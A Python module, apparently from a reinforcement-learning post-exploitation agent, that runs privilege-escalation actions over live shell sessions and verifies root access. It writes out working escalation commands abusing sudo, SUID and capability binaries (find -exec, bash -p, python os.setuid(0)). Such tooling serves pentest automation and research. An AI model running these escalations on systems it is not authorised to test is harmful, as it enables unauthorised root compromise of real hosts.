"""Shared live-session execution controller for CLI and RealEnv."""
from __future__ import annotations

from typing import Any, Dict, List, Tuple

import numpy as np

from postex_agent.core.actions import Action, VECTOR_BY_EXPLOIT_ACTION
from postex_agent.core.state import HostState
from postex_agent.environment.command_library import get_commands, _normalise_name
from postex_agent.environment.parser_registry import parse_output
from postex_agent.environment.state_builder import (
    VECTOR_RISK_PENALTIES,
    update_state,
    update_temporal,
)
from postex_agent.execution.command_executor import CommandExecutor
from postex_agent.sessions.base_session import BaseSession


def _build_verify_commands(action: Action, state: HostState) -> List[str]:
    """Build verification commands that test privilege through the exploit path.

    SSH sessions are stateless (each exec_command is a new channel), so a
    spawned root shell doesn't persist.  Instead of running bare ``id``,
    we re-test the escalation vector with ``id`` as the payload.
    """
    if action == Action.EXPLOIT_SUDO:
        # Use sudo -n (non-interactive) to run id as root
        cmds = ["sudo -n id 2>/dev/null"]
        # Also try specific binaries the agent knows about
        for entry in state.sudo_nopasswd_entries:
            for token in entry.split():
                if token.startswith("/"):
                    name = _normalise_name(token)
                    if name == "find":
                        cmds.append(f"sudo {token} . -exec id \\; -quit")
                    elif name in ("bash", "sh", "dash", "zsh"):
                        cmds.append(f"sudo {token} -c id")
                    elif name in ("python", "python3"):
                        cmds.append(
                            f'sudo {token} -c "import os; os.setuid(0); os.system(\'id\')"'
                        )
                    break  # one binary is enough
        return cmds

    if action == Action.EXPLOIT_SUID:
        cmds = []
        for path in state.exploitable_suid_bins:
            name = _normalise_name(path)
            if name in ("python", "python3"):
                cmds.append(
                    f'{path} -c "import os; os.setuid(0); os.system(\'id\')"'
                )
            elif name == "find":
                cmds.append(f"{path} . -exec id \\; -quit")
            elif name in ("bash", "sh", "dash"):
                cmds.append(f"{path} -p -c id")
            if cmds:
                break  # one is enough
        return cmds or ["id"]

    if action == Action.EXPLOIT_CAP:
        cmds = []
        for path in state.exploitable_caps:
            name = _normalise_name(path)
            if name in ("python", "python3"):
                cmds.append(
                    f'{path} -c "import os; os.setuid(0); os.system(\'id\')"'
                )
            if cmds:
                break
        return cmds or ["id"]

    # Kernel / cron / fallback — just try id
    return ["id"]


LiveStepResult = Tuple[np.ndarray, float, bool, Dict[str, Any]]


class LiveExecutionController:
    """Owns live state transitions for real shell-backed operation."""

    def __init__(
        self,
        session: BaseSession,
        max_steps: int = 30,
        log_path: str = "logs/execution.jsonl",
    ):
        self.executor = CommandExecutor(session=session, log_path=log_path)
        self.max_steps = max_steps
        self.state = HostState()
        self.steps = 0
        self.done = False
        self._cumulative_risk = 0.0

    def reset(self) -> np.ndarray:
        self.state = HostState()
        self.steps = 0
        self.done = False
        self._cumulative_risk = 0.0
        return self.state.to_vector()

    def preview_commands(self, action: int | Action) -> list[str]:
        action_enum = Action(int(action))
        return get_commands(action_enum, state=self.state)

    def step(self, action: int | Action, timeout: int = 30) -> LiveStepResult:
        if self.done:
            raise RuntimeError("Episode is done. Call reset().")

        action_enum = Action(int(action))
        commands = self.preview_commands(action_enum)
        state_before = self.state.to_dict()

        combined_output = ""
        exec_results = []

        for command in commands:
            if command.strip().startswith("#"):
                continue

            result = self.executor.execute(
                command=command,
                action_name=action_enum.name,
                timeout=timeout,
            )
            exec_results.append(result)
            combined_output += result.get("output", "") + "\n"

        parsed = parse_output(action_enum, combined_output)
        update_state(self.state, action_enum, parsed)

        if action_enum in VECTOR_BY_EXPLOIT_ACTION:
            vector = VECTOR_BY_EXPLOIT_ACTION[action_enum]
            self._cumulative_risk += VECTOR_RISK_PENALTIES.get(vector, 0.0)

            # ── Post-exploit auto-verification ────────────────────────
            # SSH sessions are stateless — each exec_command runs in a
            # fresh channel, so a spawned root shell doesn't persist.
            # Verify by testing privilege through the same escalation
            # path (e.g.  sudo -n id, SUID binary + id payload).
            if self.state.current_privilege != 1:
                verify_cmds = _build_verify_commands(action_enum, self.state)
                for vcmd in verify_cmds:
                    verify_result = self.executor.execute(
                        command=vcmd,
                        action_name="auto_verify",
                        timeout=5,
                    )
                    exec_results.append(verify_result)
                    verify_parsed = parse_output(
                        Action.VERIFY_ROOT,
                        verify_result.get("output", ""),
                    )
                    update_state(self.state, Action.VERIFY_ROOT, verify_parsed)
                    if self.state.current_privilege == 1:
                        break

        self.steps += 1
        update_temporal(self.state, self.steps, self.max_steps, self._cumulative_risk)

        if (
            action_enum == Action.STOP
            or self.state.current_privilege == 1
            or self.steps >= self.max_steps
        ):
            self.done = True

        info: Dict[str, Any] = {
            "action": action_enum.name,
            "commands": commands,
            "execution": exec_results,
            "parsed": parsed,
            "state_before": state_before,
            "state_after": self.state.to_dict(),
            "step": self.steps,
        }
        return self.state.to_vector(), 0.0, self.done, info

    @property
    def current_state(self) -> HostState:
        return self.state
